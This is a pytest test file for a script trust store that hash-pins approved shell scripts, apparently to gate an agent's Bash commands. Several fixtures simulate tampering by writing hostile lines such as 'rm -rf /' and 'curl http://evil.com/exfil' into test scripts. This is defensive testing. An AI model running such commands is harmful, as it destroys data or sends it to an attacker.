"""
Tests for Tier 2.5: Script Trust Store (TOFU - Trust On First Use)

Tests cover:
- ScriptTrustStore trust/revoke/list/verify operations
- is_trusted() with matching hash, mismatched hash, missing file, not in store
- Script detection (recognizing execution patterns)
- Pipeline integration (trusted script bypasses Tier 3)
- File permissions on creation
"""

import hashlib
import json
import os
import stat
import tempfile
from pathlib import Path
from typing import Any

import pytest

from src.tier2_5_trust import ScriptTrustStore


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def trust_store_path(tmp_path: Path) -> Path:
    """Return a temporary path for the trust store JSON file."""
    return tmp_path / "trusted-scripts.json"


@pytest.fixture
def store(trust_store_path: Path) -> ScriptTrustStore:
    """Return a ScriptTrustStore backed by a temp file."""
    return ScriptTrustStore(store_path=trust_store_path)


@pytest.fixture
def sample_script(tmp_path: Path) -> Path:
    """Create a real shell script file for testing."""
    script = tmp_path / "deploy.sh"
    script.write_text("#!/bin/bash\necho 'deploying'\n")
    return script


@pytest.fixture
def another_script(tmp_path: Path) -> Path:
    """Create a second shell script for multi-entry tests."""
    script = tmp_path / "lint.sh"
    script.write_text("#!/bin/bash\nruff check .\n")
    return script


# ---------------------------------------------------------------------------
# Trust / Revoke / List
# ---------------------------------------------------------------------------


@pytest.mark.unit
def test_trust_adds_entry(store: ScriptTrustStore, sample_script: Path):
    """trust() should record the script path with a sha256 hash."""
    entry = store.trust(str(sample_script), note="deploy script")

    assert entry["content_hash"].startswith("sha256:")
    assert entry["approved_by"] == "human"
    assert entry["note"] == "deploy script"
    assert "approved_at" in entry


@pytest.mark.unit
def test_trust_persists_to_disk(trust_store_path: Path, sample_script: Path):
    """trust() should write to disk so a new store instance can load it."""
    store1 = ScriptTrustStore(store_path=trust_store_path)
    store1.trust(str(sample_script))

    store2 = ScriptTrustStore(store_path=trust_store_path)
    entries = store2.list_trusted()
    assert str(sample_script) in entries


@pytest.mark.unit
def test_trust_file_not_found_raises(store: ScriptTrustStore, tmp_path: Path):
    """trust() should raise FileNotFoundError for non-existent scripts."""
    with pytest.raises(FileNotFoundError):
        store.trust(str(tmp_path / "ghost.sh"))


@pytest.mark.unit
def test_revoke_removes_entry(store: ScriptTrustStore, sample_script: Path):
    """revoke() should remove a trusted script entry."""
    store.trust(str(sample_script))
    removed = store.revoke(str(sample_script))

    assert removed is True
    assert str(sample_script) not in store.list_trusted()


@pytest.mark.unit
def test_revoke_nonexistent_returns_false(store: ScriptTrustStore, tmp_path: Path):
    """revoke() should return False when path was not in the store."""
    result = store.revoke(str(tmp_path / "nope.sh"))
    assert result is False


@pytest.mark.unit
def test_list_trusted_returns_all(
    store: ScriptTrustStore, sample_script: Path, another_script: Path
):
    """list_trusted() should return all entries."""
    store.trust(str(sample_script), note="deploy")
    store.trust(str(another_script), note="lint")

    entries = store.list_trusted()
    assert str(sample_script) in entries
    assert str(another_script) in entries
    assert len(entries) == 2


@pytest.mark.unit
def test_list_trusted_empty_when_nothing_added(store: ScriptTrustStore):
    """list_trusted() should return empty dict when store is empty."""
    assert store.list_trusted() == {}


# ---------------------------------------------------------------------------
# Verify
# ---------------------------------------------------------------------------


@pytest.mark.unit
def test_verify_passes_when_all_match(store: ScriptTrustStore, sample_script: Path):
    """verify() should return empty list when all hashes match."""
    store.trust(str(sample_script))
    mismatches = store.verify()
    assert mismatches == []


@pytest.mark.unit
def test_verify_detects_modified_script(store: ScriptTrustStore, sample_script: Path):
    """verify() should flag scripts whose content changed after trust."""
    store.trust(str(sample_script))

    # Modify the file after trusting it
    sample_script.write_text("#!/bin/bash\nrm -rf /\n")

    mismatches = store.verify()
    assert len(mismatches) == 1
    assert mismatches[0]["path"] == str(sample_script)
    assert mismatches[0]["issue"] == "hash_mismatch"


@pytest.mark.unit
def test_verify_detects_missing_file(store: ScriptTrustStore, sample_script: Path):
    """verify() should flag entries whose files no longer exist."""
    store.trust(str(sample_script))
    sample_script.unlink()

    mismatches = store.verify()
    assert len(mismatches) == 1
    assert mismatches[0]["path"] == str(sample_script)
    assert mismatches[0]["issue"] == "file_missing"


# ---------------------------------------------------------------------------
# Content hash
# ---------------------------------------------------------------------------


@pytest.mark.unit
def test_compute_hash_matches_sha256(store: ScriptTrustStore, sample_script: Path):
    """_compute_hash() should return sha256:<hex> matching manual computation."""
    content = sample_script.read_bytes()
    expected = "sha256:" + hashlib.sha256(content).hexdigest()
    assert store._compute_hash(str(sample_script)) == expected


# ---------------------------------------------------------------------------
# File permissions
# ---------------------------------------------------------------------------


@pytest.mark.unit
def test_store_file_has_0600_permissions(trust_store_path: Path, sample_script: Path):
    """The trust store JSON file should be created with 0600 permissions."""
    store = ScriptTrustStore(store_path=trust_store_path)
    store.trust(str(sample_script))

    mode = oct(stat.S_IMODE(trust_store_path.stat().st_mode))
    assert mode == oct(0o600), f"Expected 0o600 but got {mode}"


# ---------------------------------------------------------------------------
# is_trusted() - script detection and hash verification
# ---------------------------------------------------------------------------


@pytest.mark.unit
def test_is_trusted_with_matching_hash(store: ScriptTrustStore, sample_script: Path):
    """is_trusted() should approve a trusted script whose hash matches."""
    store.trust(str(sample_script))
    is_trusted, category = store.is_trusted("Bash", {"command": str(sample_script)})

    assert is_trusted is True
    assert category == "trusted_script"


@pytest.mark.unit
def test_is_trusted_with_mismatched_hash(store: ScriptTrustStore, sample_script: Path):
    """is_trusted() should return False when script content changed."""
    store.trust(str(sample_script))
    sample_script.write_text("#!/bin/bash\nmalicious command\n")

    is_trusted, category = store.is_trusted("Bash", {"command": str(sample_script)})
    assert is_trusted is False
    assert "hash_mismatch" in (category or "")


@pytest.mark.unit
def test_is_trusted_with_missing_file(store: ScriptTrustStore, sample_script: Path):
    """is_trusted() should return False when the trusted file no longer exists."""
    store.trust(str(sample_script))
    sample_script.unlink()

    is_trusted, category = store.is_trusted("Bash", {"command": str(sample_script)})
    assert is_trusted is False
    assert "missing" in (category or "")


@pytest.mark.unit
def test_is_trusted_when_not_in_store(store: ScriptTrustStore, sample_script: Path):
    """is_trusted() should return False for scripts not in the store."""
    is_trusted, category = store.is_trusted("Bash", {"command": str(sample_script)})
    assert is_trusted is False
    assert category is None


@pytest.mark.unit
def test_is_trusted_non_bash_tool_returns_false(store: ScriptTrustStore):
    """is_trusted() should return False for non-Bash tools."""
    is_trusted, category = store.is_trusted("Read", {"file_path": "/some/script.sh"})
    assert is_trusted is False
    assert category is None


# ---------------------------------------------------------------------------
# Script detection - recognizing execution patterns
# ---------------------------------------------------------------------------


@pytest.mark.unit
@pytest.mark.parametrize(
    "command,expected_path",
    [
        ("/path/to/script.sh", "/path/to/script.sh"),
        ("./script.sh", "./script.sh"),
        ("bash /home/user/deploy.sh", "/home/user/deploy.sh"),
        ("bash ./setup.sh", "./setup.sh"),
        ("sh /opt/scripts/run.sh", "/opt/scripts/run.sh"),
        ("sh -c /path/to/script.sh", "/path/to/script.sh"),
    ],
)
def test_detect_script_path(store: ScriptTrustStore, command: str, expected_path: str):
    """_extract_script_path() should detect various script execution patterns."""
    extracted = store._extract_script_path(command)
    assert extracted == expected_path, f"From '{command}' expected '{expected_path}', got '{extracted}'"


@pytest.mark.unit
@pytest.mark.parametrize(
    "command",
    [
        "npm install",
        "git status",
        "pytest",
        "echo hello",
        "ls -la",
        "python main.py",  # .py not a shell script
    ],
)
def test_no_script_detected_for_non_scripts(store: ScriptTrustStore, command: str):
    """_extract_script_path() should return None for non-script commands."""
    assert store._extract_script_path(command) is None


# ---------------------------------------------------------------------------
# is_trusted() with bash/sh prefix patterns
# ---------------------------------------------------------------------------


@pytest.mark.unit
def test_is_trusted_with_bash_prefix(store: ScriptTrustStore, sample_script: Path):
    """is_trusted() should detect 'bash /path/to/script.sh' pattern."""
    store.trust(str(sample_script))
    is_trusted, category = store.is_trusted(
        "Bash", {"command": f"bash {sample_script}"}
    )
    assert is_trusted is True
    assert category == "trusted_script"


@pytest.mark.unit
def test_is_trusted_with_sh_prefix(store: ScriptTrustStore, sample_script: Path):
    """is_trusted() should detect 'sh /path/to/script.sh' pattern."""
    store.trust(str(sample_script))
    is_trusted, category = store.is_trusted(
        "Bash", {"command": f"sh {sample_script}"}
    )
    assert is_trusted is True
    assert category == "trusted_script"


# ---------------------------------------------------------------------------
# Pipeline integration - trusted scripts bypass Tier 3
# ---------------------------------------------------------------------------


@pytest.mark.integration
def test_trusted_script_bypasses_tier3(
    trust_store_path: Path, sample_script: Path
):
    """A trusted script should be approved at Tier 2.5, not reaching Tier 3."""
    from src.tier1_dangerous import DangerousPatternDetector
    from src.tier2_safe import SafeOperationDetector

    store = ScriptTrustStore(store_path=trust_store_path)
    store.trust(str(sample_script))

    dangerous_detector = DangerousPatternDetector()
    safe_detector = SafeOperationDetector()

    tool_name = "Bash"
    input_data = {"command": str(sample_script)}

    # Tier 1 should not block it
    is_dangerous, _ = dangerous_detector.is_dangerous(tool_name, input_data)
    assert is_dangerous is False

    # Tier 2 should not catch it (it's a script path, not a standard safe command)
    is_safe, _ = safe_detector.is_safe(tool_name, input_data)
    assert is_safe is False

    # Tier 2.5 should approve it
    is_trusted, category = store.is_trusted(tool_name, input_data)
    assert is_trusted is True
    assert category == "trusted_script"


@pytest.mark.integration
def test_modified_script_falls_through_to_tier3(
    trust_store_path: Path, sample_script: Path
):
    """A script with a changed hash should NOT be approved at Tier 2.5."""
    store = ScriptTrustStore(store_path=trust_store_path)
    store.trust(str(sample_script))

    # Simulate script modification
    sample_script.write_text("#!/bin/bash\ncurl http://evil.com/exfil\n")

    is_trusted, category = store.is_trusted("Bash", {"command": str(sample_script)})
    assert is_trusted is False
    # Should fall through to Tier 3 - not blocked by Tier 2.5


@pytest.mark.integration
def test_tier1_dangerous_still_blocks_trusted_scripts(
    trust_store_path: Path, tmp_path: Path
):
    """Even if a script is trusted, Tier 1 patterns in command should block it.

    Note: This tests the pipeline ORDER: Tier 1 runs before Tier 2.5.
    If someone constructs a command like 'bash /trusted/script.sh && rm -rf /',
    Tier 1 catches it first.
    """
    from src.tier1_dangerous import DangerousPatternDetector

    dangerous_script = tmp_path / "sneaky.sh"
    dangerous_script.write_text("#!/bin/bash\nrm -rf /\n")

    store = ScriptTrustStore(store_path=trust_store_path)
    store.trust(str(dangerous_script))

    dangerous_detector = DangerousPatternDetector()

    # The command itself contains rm -rf which Tier 1 will catch
    command = f"bash {dangerous_script} && rm -rf /"
    is_dangerous, reason = dangerous_detector.is_dangerous("Bash", {"command": command})
    assert is_dangerous is True
    assert reason is not None


# ---------------------------------------------------------------------------
# on_change callback
# ---------------------------------------------------------------------------


@pytest.mark.unit
def test_on_change_fires_on_trust(trust_store_path: Path, sample_script: Path):
    """on_change callback should fire with ('trust', path, entry) when trusting."""
    calls = []
    store = ScriptTrustStore(
        store_path=trust_store_path,
        on_change=lambda action, path, entry: calls.append((action, path, entry)),
    )
    store.trust(str(sample_script), note="test")

    assert len(calls) == 1
    action, path, entry = calls[0]
    assert action == "trust"
    assert path == str(sample_script.resolve())
    assert entry["content_hash"].startswith("sha256:")
    assert entry["note"] == "test"


@pytest.mark.unit
def test_on_change_fires_on_revoke(trust_store_path: Path, sample_script: Path):
    """on_change callback should fire with ('revoke', path, None) when revoking."""
    calls = []
    store = ScriptTrustStore(
        store_path=trust_store_path,
        on_change=lambda action, path, entry: calls.append((action, path, entry)),
    )
    store.trust(str(sample_script))
    calls.clear()

    store.revoke(str(sample_script))

    assert len(calls) == 1
    action, path, entry = calls[0]
    assert action == "revoke"
    assert path == str(sample_script.resolve())
    assert entry is None


@pytest.mark.unit
def test_on_change_not_called_when_none(trust_store_path: Path, sample_script: Path):
    """Store should work fine with no on_change callback."""
    store = ScriptTrustStore(store_path=trust_store_path)
    store.trust(str(sample_script))
    store.revoke(str(sample_script))
    # No exception raised — that's the test
